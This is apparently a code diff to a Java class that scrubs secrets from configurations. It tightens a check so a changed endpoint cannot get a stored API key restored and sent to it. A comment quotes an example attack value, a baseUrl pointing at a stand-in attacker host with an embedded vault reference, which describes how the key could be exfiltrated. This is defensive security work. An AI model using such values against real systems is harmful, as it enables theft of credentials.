@@ -187,7 +187,15 @@ final class ScrubbedSecrets {
         // the apiKey placeholder and changed type had the target's key restored and
         // sent to the other vendor's default endpoint. The rule is shared with the
         // JSON Patch path, so the two cannot disagree on what a destination is.
-        return CredentialDestinations.changesDestination(sourceMap, targetMap, ScrubbedSecrets::isTargetBound);
+        // A target-bound source value counts as unchanged only where merge() really
+        // replaces it by the target's: the target holds a string there and
+        // keepsTarget() agrees. A bound value the target has nothing for is kept as
+        // written by merge(), so it is a destination like any other — skipping it on
+        // isTargetBound() alone let "https://attacker.example/v1?ref=${vault:k}"
+        // through as a "bound" baseUrl the target never had, and the target's apiKey
+        // was restored beside it.
+        return CredentialDestinations.changesDestination(sourceMap, targetMap,
+                (source, target) -> isTargetBound(source) && keepsTarget(source, target));
     }
 
     private static boolean isVaultReference(String text) {
